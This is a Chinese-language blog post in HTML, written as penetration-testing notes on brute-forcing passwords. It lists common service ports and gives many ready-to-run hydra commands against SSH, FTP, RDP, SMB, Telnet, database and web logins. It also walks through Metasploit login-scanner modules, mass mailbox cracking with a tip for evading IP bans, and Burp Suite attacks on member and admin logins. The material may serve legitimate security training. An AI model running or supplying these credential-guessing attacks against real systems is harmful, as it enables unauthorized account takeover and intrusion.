@@ -1,0 +1,396 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>穷举篇 | 博客</title><meta name="author" content="hya"><meta name="copyright" content="hya"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="referrer" content="no-referrer"><meta name="description" content="渗透测试穷举">
+<meta property="og:type" content="article">
+<meta property="og:title" content="穷举篇">
+<meta property="og:url" content="http://example.com/post/4eaf266d.html">
+<meta property="og:site_name" content="博客">
+<meta property="og:description" content="渗透测试穷举">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/1.jpg">
+<meta property="article:published_time" content="2024-03-07T03:18:00.000Z">
+<meta property="article:modified_time" content="2024-03-07T08:53:07.330Z">
+<meta property="article:author" content="hya">
+<meta property="article:tag" content="爆破">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/1.jpg"><link rel="shortcut icon" href="/img/hya.jpg"><link rel="canonical" href="http://example.com/post/4eaf266d.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":true,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":300},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":60,"languages":{"author":"作者: hya","link":"链接: ","source":"来源: 博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '穷举篇',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-03-07 16:53:07'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css"  media="defer" onload="this.media='all'"><link rel="stylesheet" href="/css/style.css" ><!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.css" /><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-footer-beautify@1.0.0/lib/runtime.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/hya4.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> 其他</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/1.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="博客"><span class="site-name">博客</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-heartbeat"></i><span> 其他</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></li><li><a class="site-page child" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">穷举篇</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-03-07T03:18:00.000Z" title="发表于 2024-03-07 11:18:00">2024-03-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-03-07T08:53:07.330Z" title="更新于 2024-03-07 16:53:07">2024-03-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="穷举篇"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="穷举篇"><a href="#穷举篇" class="headerlink" title="穷举篇"></a>穷举篇</h1><h2 id="文件和目录穷举"><a href="#文件和目录穷举" class="headerlink" title="文件和目录穷举"></a>文件和目录穷举</h2><ul>
+<li><strong>Pker多线程后台极速扫描工具V2.01修正版</strong></li>
+<li><strong>御剑</strong></li>
+<li><strong>dirbuster</strong></li>
+</ul>
+<h2 id="常见的端口服务"><a href="#常见的端口服务" class="headerlink" title="常见的端口服务"></a>常见的端口服务</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">这些是计算机网络中常见的端口号和对应的服务。下面是对每个端口号的解释：</span><br><span class="line"></span><br><span class="line">- HTTP (80)：超文本传输协议，用于在Web浏览器和服务器之间传输HTML页面和其他数据。</span><br><span class="line">- HTTPS (443)：安全的HTTP协议，使用SSL/TLS加密来保护数据传输的安全性。</span><br><span class="line">- FTP (21)：文件传输协议，用于在网络上进行文件的上传和下载。</span><br><span class="line">- SSH (22)：安全外壳协议，用于远程登录到服务器并执行命令。</span><br><span class="line">- MySQL (3306)：关系型数据库管理系统，用于存储和管理数据。</span><br><span class="line">- MSSQL (1433)：Microsoft SQL Server数据库的默认端口号。</span><br><span class="line">- Rsync (873)：远程同步协议，用于在计算机之间同步文件和目录。</span><br><span class="line">- Oracle (1521)：Oracle数据库的默认端口号。</span><br><span class="line">- MongoDB (27017)：NoSQL数据库，用于存储和检索非结构化数据。</span><br><span class="line">- Redis (6379)：内存数据结构存储系统，用于缓存和存储数据。</span><br><span class="line">- Tomcat (8080)：Java Web服务器，用于托管Java Web应用程序。</span><br><span class="line">- SMTP (25)：简单邮件传输协议，用于发送电子邮件。</span><br><span class="line">- POP3 (110)：邮局协议版本3，用于接收电子邮件。</span><br><span class="line">- DNS (53)：域名系统，用于将域名解析为IP地址。</span><br><span class="line">- Telnet (23)：远程终端协议，用于通过网络连接到远程主机。</span><br><span class="line">- VNC (5900)：虚拟网络计算，用于远程桌面共享和远程控制。</span><br><span class="line">- PCAnywhere (5632)：远程访问软件，用于远程控制计算机。</span><br><span class="line">- Apache/Tomcat/Nginx/Axis2/resin/jboss (80|8080)：Web服务器和应用程序服务器，用于托管Web应用程序。</span><br><span class="line">- WebLogic (7001)：Java应用服务器，用于部署和运行Java应用程序。</span><br><span class="line">- Jenkins (8080, 8089)：持续集成和持续交付工具，用于自动化构建、测试和部署软件。</span><br><span class="line">- SNMP (161)：简单网络管理协议，用于监控和管理网络设备。</span><br><span class="line">- Zabbix (8069)：监控系统，用于收集和分析网络设备的性能指标。</span><br><span class="line">- Elasticsearch (9200, 9300)：分布式搜索和分析引擎，用于存储和检索大量数据。</span><br><span class="line">- RDP (3389)：远程桌面协议，用于远程桌面连接和远程操作。</span><br></pre></td></tr></table></figure>
+
+<h2 id="常见端口服务穷举"><a href="#常见端口服务穷举" class="headerlink" title="常见端口服务穷举"></a>常见端口服务穷举</h2><p><strong>穷举爆破神器hydra</strong></p>
+<p><strong>下载地址：</strong><a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.thc.org/">https://www.thc.org/</a>	或	<a target="_blank" rel="noopener external nofollow noreferrer" href="https://www.thc.org/releases/hydra-8.4.tar.gz">https://www.thc.org/releases/hydra-8.4.tar.gz</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/h-y-a/picture/raw/master/images/202403071640545.png" alt="image-20240131173007486"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">使用示例：</span><br><span class="line">破解SSH密码使用字典对目标服务进行破解：hydra -L users.txt -P password.txt ssh://127.0.0.1</span><br><span class="line">当目标服务开放的端口不是默认端口时，使用 -s 进行指定：hydra  -L user.txt -P password.txt  ssh://127.0.0.1  -s 77744</span><br><span class="line">将破解的密码存储到指定文件：hydra  -L users.txt -P password.txt  ssh://127.0.0.1  -s 40 -o ssh.txt</span><br><span class="line"></span><br><span class="line"> hydra破解不同协议的密码：</span><br><span class="line"> ​#破解ssh:        hydra -L users.txt -P password.txt -vV -o ssh.log -e ns IP ssh</span><br><span class="line">#破解https：     hydra -m /index.php -l username -P pass.txt IP https</span><br><span class="line">#破解teamspeak： hydra -l 用户名 -P 密码字典 -s 端口号 -vV ip teamspeak</span><br><span class="line">#破解cisco：     hydra -P pass.txt IP cisco</span><br><span class="line"> hydra -m cloud -P pass.txt 127.0.0.1 cisco-enable</span><br><span class="line">#破解smb：       hydra -l administrator -P pass.txt IP smb</span><br><span class="line">#破解pop3：      hydra -l muts -P pass.txt my.pop3.mail pop3</span><br><span class="line">#破解rdp：       hydra IP rdp -l administrator -P pass.txt -V          </span><br><span class="line">#破解http-proxy: hydra -l admin -P pass.txt http-proxy://127.0.0.1  </span><br><span class="line">#破解telnet:     hydra IP telnet -l 用户 -P 密码字典 -t 32 -s 23 -e ns -f -V</span><br><span class="line">#破解ftp:       hydra IP ftp -l 用户名 -P 密码字典 -t 线程(默认16) -vV</span><br><span class="line">#get方式提交，破解web登录: </span><br><span class="line"> hydra IP ftp -l 用户名 -P 密码字典 -e ns -vV</span><br><span class="line"> hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns IP http-get /admin/</span><br><span class="line"> hydra -l 用户名 -p 密码字典 -t 线程 -vV -e ns -f IP http-get /admin/index.php</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">参数中文解释：</span><br><span class="line">-R 继续从上一次进度接着破解。</span><br><span class="line">-S 采用SSL链接。</span><br><span class="line">-s PORT 可通过这个参数指定非默认端口。</span><br><span class="line">-l LOGIN 指定破解的用户，对特定用户破解。</span><br><span class="line">-L FILE 指定用户名字典。</span><br><span class="line">-p PASS 小写，指定密码破解，少用，一般是采用密码字典。</span><br><span class="line">-P FILE 大写，指定密码字典。</span><br><span class="line">-e ns 可选选项，n：空密码试探，s：使用指定用户和密码试探。</span><br><span class="line">-C FILE 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数。</span><br><span class="line">-M FILE 指定目标列表文件一行一条。</span><br><span class="line">-o FILE 指定结果输出文件。</span><br><span class="line">-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解。</span><br><span class="line">-t TASKS 同时运行的线程数，默认为16。</span><br><span class="line">-w TIME 设置最大超时的时间，单位秒，默认是30s。</span><br><span class="line">-v / -V 显示详细过程。</span><br><span class="line"></span><br><span class="line">另一个版本示例：</span><br><span class="line">1. **SSH**</span><br><span class="line">hydra -L /root/user -P /root/passwd ssh://192.168.1.0 -f -o /root/crack.txt -V</span><br><span class="line">这条命令试图通过SSH协议暴力破解192.168.1.0主机上的用户账户。-L 参数指定用户名列表文件路径（这里是/root/user），-P 参数指定密码列表文件路径（这里是/root/passwd）。-f 表示在找到有效的凭据后立即停止攻击，-o 指定输出文件（成功登录的用户名和密码会记录在此处），-V 则表示详细模式，显示进度信息。</span><br><span class="line"></span><br><span class="line">2. **FTP**</span><br><span class="line">hydra -L /root/user -P /root/passwd ftp://192.168.1.0 -f -o /root/crack.txt -V</span><br><span class="line">类似于上一条，这条命令针对的是FTP服务，尝试暴力破解192.168.1.0主机的FTP登录凭据。</span><br><span class="line"></span><br><span class="line">3. **RDP**</span><br><span class="line">hydra -L /root/user -P /root/passwd rdp://192.168.1.0 -f -o /root/crack.txt -V</span><br><span class="line">此命令针对的是Windows远程桌面协议(RDP)，尝试暴力破解192.168.1.0主机的RDP登录凭证。</span><br><span class="line"></span><br><span class="line">4. **MSSQL**</span><br><span class="line">hydra -L /root/user -P /root/passwd mssql://192.168.0.129 -f -o /root/crack.txt -v</span><br><span class="line">这条命令用于暴力破解Microsoft SQL Server（MSSQL）数据库，尝试登录至192.168.0.129主机的数据库实例。</span><br><span class="line"></span><br><span class="line">5. **MySQL**</span><br><span class="line">hydra -L /root/user -P /root/passwd mysql://192.168.0.129 -f -o /root/crack.txt –v -s 3306</span><br><span class="line">此命令针对MySQL数据库服务，通过TCP端口3306对192.168.0.129主机进行暴力破解。</span><br><span class="line"></span><br><span class="line">6. **Oracle**</span><br><span class="line">hydra -P /root/passwd oracle://192.168.0.129 -f -o /root/crack.txt –v</span><br><span class="line">这条命令针对Oracle数据库服务，尝试登录至192.168.0.129主机的Oracle实例，只提供了密码列表（没有列出用户名列表）。</span><br><span class="line"></span><br><span class="line">7. **Redis**</span><br><span class="line">hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 redis</span><br><span class="line">对Redis服务进行暴力破解，仅使用密码列表，启用大小写不敏感(-e nsr)及所有特殊字符，并使用16个并发线程尝试破解192.168.0.101主机上的Redis实例。</span><br><span class="line"></span><br><span class="line">8. **PostgreSQL**</span><br><span class="line">hydra -P /root/passlist.txt -e nsr -t 16 192.168.0.101 postgresql</span><br><span class="line">同样是对数据库服务进行破解，这次针对的是PostgreSQL，使用相同的设置（密码列表、大小写不敏感和特殊字符）以及16个并发线程尝试登录192.168.0.101主机上的PostgreSQL数据库。</span><br><span class="line"></span><br><span class="line">9. **指定多个IP进行穷举**</span><br><span class="line">hydra -L /root/user -P /root/passlist -M /root/ip.txt -V -o /root/crack mysql -t 16</span><br><span class="line">使用多个IP地址进行MySQL服务的暴力破解，其中-L 和 -P 分别指定了用户名和密码列表，-M 指定了包含目标IP地址的文件，-V 显示详细信息，-o 输出文件名，-t 指定了并发线程数为16。</span><br></pre></td></tr></table></figure>
+
+<h2 id="kali-metasploit-穷举模块使用"><a href="#kali-metasploit-穷举模块使用" class="headerlink" title="kali metasploit 穷举模块使用"></a>kali metasploit 穷举模块使用</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">这些是Metasploit框架中的各种扫描辅助模块，用于检测不同类型的服务（如FTP、SSH、Telnet等）的登录凭据是否存在弱密码或默认密码。通过使用这些模块，攻击者可以对目标系统进行暴力破解攻击，以获取访问权限。模块示例：</span><br><span class="line">auxiliary/scanner/ftp/ftp_login</span><br><span class="line">auxiliary/scanner/ssh/ssh_login</span><br><span class="line">auxiliary/scanner/telnet/telnet_login</span><br><span class="line">auxiliary/scanner/smb/smb_login</span><br><span class="line">auxiliary/scanner/mssql/mssql_login</span><br><span class="line">auxiliary/scanner/mysql/mysql_login</span><br><span class="line">auxiliary/scanner/oracle/oracle_login</span><br><span class="line">auxiliary/scanner/postgres/postgres_login</span><br><span class="line">auxiliary/scanner/vnc/vnc_login</span><br><span class="line">auxiliary/scanner/pcanywhere/pcanywhere_login</span><br><span class="line">auxiliary/scanner/snmp/snmp_login</span><br><span class="line"></span><br><span class="line">msfconsole		//启动metasploit模块</span><br><span class="line">help</span><br><span class="line"># 查看所有核心命令的帮助摘要</span><br><span class="line">msf6 &gt; help</span><br><span class="line"># 查看某一核心命令的详细帮助</span><br><span class="line">msf6 &gt; help &lt;command&gt;</span><br><span class="line"># 例如，查看 `use` 命令的帮助</span><br><span class="line">msf6 &gt; help use</span><br><span class="line"># 查看模块相关的命令帮助</span><br><span class="line">msf6 &gt; show modules</span><br><span class="line"># 查看特定模块的帮助</span><br><span class="line">msf6 &gt; show module &lt;module_path&gt; -h</span><br><span class="line"># 示例，查看一个exploit模块的帮助</span><br><span class="line">msf6 &gt; show module exploits/windows/smb/ms08_067_netapi -h</span><br><span class="line">set: 这个命令用于设置模块的参数例如</span><br><span class="line">show options: 这个命令用于显示当前模块的所有设置和参数。</span><br><span class="line">back: 这个命令用于返回到上一级菜单或模块。</span><br><span class="line">info: 这个命令用于显示当前模块的信息，包括描述、作者、参考链接等。</span><br><span class="line">exploit/run: 这个命令用于运行当前选中的模块。在Metasploit中，模块可以是auxiliary（辅助模块）、exploit（利用模块）或post（后期利用模块）。</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">msf6 &gt; use auxiliary/scanner/ssh/ssh_login</span><br><span class="line">#这段代码是在使用Metasploit框架（msfconsole）时，选择了名为&quot;ssh_login&quot;的SSH登录扫描辅助模块。这个模块用于检测SSH服务器上是否存在弱密码或默认密码，以进行暴力破解攻击。</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; info</span><br><span class="line">#显示当前模块的信息，包括描述、作者、参考链接等。</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 192.168.3.106</span><br><span class="line">RHOSTS =&gt; 192.168.3.106		#设置目标主机IP地址为192.168.3.106</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set USERNAME root</span><br><span class="line">USERNAME =&gt; root		#设置用户名为root</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; set PASS_FILE /root/passwd.txt</span><br><span class="line">PASS_FILE =&gt; /root/passwd.txt		设置密码文件路径为/root/passwd.txt，该文件中包含了用于暴力破解的密码列表</span><br><span class="line">msf6 auxiliary(scanner/ssh/ssh_login) &gt; show options	#显示当前模块的所有设置和参数。</span><br></pre></td></tr></table></figure>
+
+<h2 id="邮箱穷举"><a href="#邮箱穷举" class="headerlink" title="邮箱穷举"></a>邮箱穷举</h2><p><strong>MailCracker工具</strong>：D:\xinan\穷举工具\穷举工具\穷举工具\MailCracker_Trial</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641884.png" alt="image-20240201145917034"></p>
+<p><strong>通用邮箱穷举</strong></p>
+<p>使用脚本来进行字典不能太多最好10个以内不然会被封ip</p>
+<h2 id="网站篇"><a href="#网站篇" class="headerlink" title="网站篇"></a>网站篇</h2><p><strong>burpsuite 通用破解方法</strong>：<strong>网站会员批量登录穷举、指定后台密码穷举</strong></p>
+<p>打开burpsuite并且设置代理</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641766.png" alt="image-20240201162029158"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641198.png" alt="image-20240201164734443"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641136.png" alt="image-20240201165442734"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641614.png" alt="image-20240201165821708"></p>
+<p>注意看（Status）状态码和（Length）长度，成功会跳转页面状态码为Status（302）如下图：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641279.png" alt="image-20240201171430133"></p>
+<p><strong>phpMyAdmin暴力破解v1.3（单线程）</strong>：D:\xinan\穷举工具\穷举工具\穷举工具\phpMyAdmin暴力破解v1.3.exe<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://gitee.com/h-y-a/picture/raw/master/images/202403071641845.png" alt="image-20240202090734625"></p>
